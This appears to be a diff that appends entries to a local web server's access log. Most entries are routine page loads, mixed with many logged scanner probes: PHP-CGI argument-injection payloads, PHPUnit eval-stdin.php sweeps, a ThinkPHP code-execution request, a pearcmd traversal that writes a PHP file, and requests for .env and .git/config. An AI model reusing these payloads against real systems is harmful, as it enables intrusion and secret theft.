@@ -23685,3 +23685,825 @@ BrokenPipeError: [Errno 32] Broken pipe
 127.0.0.1 - - "GET / HTTP/1.1" 200 -
 127.0.0.1 - - "POST /xmlrpc.php HTTP/1.1" 400 -
 127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /images/ai-icon.png HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /images/ai-icon.png HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /api/mcp HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /mcp HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /mcp/ HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /sse HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /.env HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 400 -
+127.0.0.1 - - "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 400 -
+127.0.0.1 - - "POST /index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input HTTP/1.1" 400 -
+127.0.0.1 - - "POST /test.hello?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input HTTP/1.1" 400 -
+127.0.0.1 - - "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1" 400 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /containers/json HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET /css/style-fixed.css HTTP/1.1" 200 -
+127.0.0.1 - - "GET /js/main.js HTTP/1.1" 200 -
+127.0.0.1 - - "GET /js/api-fixed.js HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /images/ai-icon.png HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /images/ai-icon.png HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /images/ai-icon.png HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /sellers.json HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 501, message Unsupported method ('PROPFIND')
+127.0.0.1 - - "PROPFIND / HTTP/1.1" 501 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /developmentserver/metadatauploader HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET /css/style-fixed.css HTTP/1.1" 200 -
+127.0.0.1 - - "GET /js/api-fixed.js HTTP/1.1" 200 -
+127.0.0.1 - - "GET /js/main.js HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET /js/main.js HTTP/1.1" 200 -
+127.0.0.1 - - "GET /js/api-fixed.js HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET /js/main.js HTTP/1.1" 200 -
+127.0.0.1 - - "GET /js/api-fixed.js HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /Dr0v HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /.well-known/security.txt HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /cdn-cgi/trace HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /images/ai-icon.png HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /.well-known/security.txt HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /security.txt HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET /css/style-fixed.css HTTP/1.1" 200 -
+127.0.0.1 - - "GET /js/main.js HTTP/1.1" 200 -
+127.0.0.1 - - "GET /js/api-fixed.js HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /admin/assets/js/views/login.js HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /admin/assets/js/views/login.js HTTP/1.1" 404 -
+127.0.0.1 - - "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 400 -
+127.0.0.1 - - "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 400 -
+127.0.0.1 - - "POST /index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input HTTP/1.1" 400 -
+127.0.0.1 - - "POST /test.hello?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input HTTP/1.1" 400 -
+127.0.0.1 - - "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1" 400 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /containers/json HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /.env HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /version HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "POST /xmlrpc.php HTTP/1.1" 400 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /pub/ HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET /css/style-fixed.css HTTP/1.1" 200 -
+127.0.0.1 - - "GET /js/main.js HTTP/1.1" 200 -
+127.0.0.1 - - "GET /js/api-fixed.js HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /images/ai-icon.png HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /ReportServer HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /v1/models HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET /js/api-fixed.js HTTP/1.1" 200 -
+127.0.0.1 - - "GET /js/main.js HTTP/1.1" 200 -
+127.0.0.1 - - "GET /css/style-fixed.css HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /images/ai-icon.png HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET /js/api-fixed.js HTTP/1.1" 200 -
+127.0.0.1 - - "GET /js/main.js HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /images/ai-icon.png HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /images/ai-icon.png HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /.env HTTP/1.1" 404 -
+127.0.0.1 - - "POST / HTTP/1.1" 400 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /.env HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /.git/config HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "POST /web_shell_cmd.gch HTTP/1.1" 400 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /images/ai-icon.png HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /.well-known/security.txt HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /security.txt HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /.git/HEAD HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "POST /mcp HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /sse HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /images/ai-icon.png HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /phpinfo.php HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /.env HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /.git/config HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /.env HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /.git/config HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /owa/auth/logon.aspx HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /webui/ HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /images/ai-icon.png HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /geoserver/web/ HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /.git/config HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - "GET / HTTP/1.1" 200 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /sitemap.xml HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /contact HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /contact-us HTTP/1.1" 404 -
+127.0.0.1 - - code 404, message Not Found
+127.0.0.1 - - "GET /kontakt HTTP/1.1" 404 -
